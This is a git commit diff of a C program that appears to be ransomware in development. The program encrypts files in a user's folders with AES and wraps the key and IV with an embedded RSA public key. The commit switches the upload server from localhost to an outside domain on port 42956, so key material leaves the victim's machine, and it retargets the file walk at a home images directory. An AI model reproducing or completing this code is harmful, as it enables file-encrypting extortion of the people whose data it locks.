34d132b74755f7bc946a98a6c657b10acf9b7599
Mikey <leblancmike525252@gmail.com>
2024-07-12 17:47:38 +0200

    fix code

--- main.c
+++ main.c
@@ -76,10 +76,10 @@ int main(){
     static const unsigned char aad[] = "Cyan";
 
     //Encrypt the specified file
-    encrypt_file(key, iv, aad, "1v1.jpg");
+    //encrypt_file(key, iv, aad, "1v1.jpg");
 
     //Decrypt the specified file
-    decryptFile(key, iv, aad, "1v1.jpg.cha");
+    //decryptFile(key, iv, aad, "1v1.jpg.cha");
 
     //Encrypt the AES key and IV with the RSA public key
     const char* public_key_pem = "-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAl+Ddet9QlwRgiq0m5bks\nK1pECg8k/lPvHjFbdsz2IPWA2annk/aYmN8DZR4+fz1NSy6mcxHoCJPh9mK4ngJ8\nezml7P5008MsDSohPQdaCDlZu3YV7mQGrtx1cZgxN8FjGszAAhU0BovdKM6OHmKb\nvPH08tV/SZuu0skcDDVTHZwrm4GYuFIi6dBLyIKuzYytXNt2Y7YT9r9NINVdpIf5\nnzY+6KobIjX/B3z4IvF8DHyESf8/u+SNAfe+kTK/INO8/TqUY1Y568QH6dbPro7z\nAABa6tj62d7mVD68vaQI6nh5Vh7TN0Ps6SnjBDV+NbTKq1jA5dEH+I9EMJx69n0m\nxyYpt5q5mRdn0ya7VqNkUT7jTZQ2gyPy0Yf8u8jBZ6lpaEvnqltlmsGpx3SAjKkl\nrrnDXqq+VopCIEFBVps1opjZtk5jafp5TP/JCzNFzW3ajaAZdWFbppHCWeegE4d7\nVOJqh+w3jpxAzbAUYu5Sykc2sWZZep82FhBSlqeDBJ1PmOsi5oiMSgAnUNGzaBOn\n1ZWjvXRTAC9zd/EyOzKoQ4eQh7UJYsIdzbDMdgq15Cesgp18+ohvcdtnmAHQ//mH\nKU1TOQ8qlPjvIeYAdXQT+qwXNPTadxszucJs3c+7BLxJMXD/bMh4Sq6PYza3Rg27\nF07u/gwEJGvCzV87VvqAj90CAwEAAQ==\n-----END PUBLIC KEY-----\n";
@@ -91,7 +91,7 @@ int main(){
     OPENSSL_free(encrypted_iv);
 
     //const char *URL = "http://127.0.0.1:42956/upload";
-    char ip[] = "127.0.0.1";
+    char ip[] = "willchabemyvalentine.love";
     int port = 42956;
     const char *URL[100];
     sprintf(URL, "http://%s:%d/upload", ip, port);
@@ -181,13 +181,13 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, con
     #ifdef _WIN32
     path = "C:\\Users\\me\\Documents";
     #else
-    path = "/home/mike/Images/Captures\ d’écran";
+    path = "/home/mike/Images";
     #endif
 
     PathList pathList;
     initPathList(&pathList);
 
-    listFiles(path, &pathList);
+    linuxListFiles(path, &pathList);
 
     //Browse files
     for (size_t i = 0; i < pathList.count; ++i) {
